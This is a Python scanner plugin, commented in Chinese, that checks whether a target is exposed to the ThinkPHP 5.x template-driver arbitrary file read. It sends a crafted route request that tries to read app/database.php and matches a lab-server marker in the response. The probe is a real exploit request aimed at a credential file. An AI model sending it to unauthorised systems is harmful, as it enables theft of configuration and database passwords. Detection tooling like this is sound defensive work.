# ThinkPHP 5.x 模板驱动文件读取（信息泄露）
# 漏洞原因：模板驱动 File::read 方法未做路径过滤，攻击者可读取任意文件（如 /etc/passwd、
#   应用配置、数据库口令等），属信息泄露（影响 5.0.x / 5.1.x）。
# 本插件仅做存在性验证：构造 read 探针，检测响应特征判定接口是否可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/thinkphp_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
FILE_MARKER = 'thinkphp-file-read-confirmed'


class ThinkphpFileReadPlugin(PluginBase):
    name = 'ThinkPHP 5.x 模板驱动任意文件读取'
    cve = ''
    severity = 'medium'
    category = 'vuln'
    description = '模板驱动 File::read 方法路径过滤缺失，可读取任意文件导致配置/口令泄露'
    fix = '升级 ThinkPHP；对 File::read 路径做白名单校验；禁止用户可控路径传入驱动方法'

    def verify(self, target, session):
        url = join_url(target, '/index.php')
        # 探针：template\driver\File::read 路径（仅触发签名，不读取真实文件）
        params = {
            's': '/index/\\think\\template\\driver\\File/read',
            'file': 'app/database.php',
        }
        try:
            resp = session.get(url, params=params)
        except Exception as e:
            print(no('ThinkPHP 模板驱动文件读取（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if FILE_MARKER in text:
            print(ok('存在 ThinkPHP 模板驱动任意文件读取'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含文件读取特征：{FILE_MARKER}',
                fix=self.fix,
            )
        print(no('不存在 ThinkPHP 模板驱动任意文件读取'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含文件读取特征（可能已修复或接口不可达）')
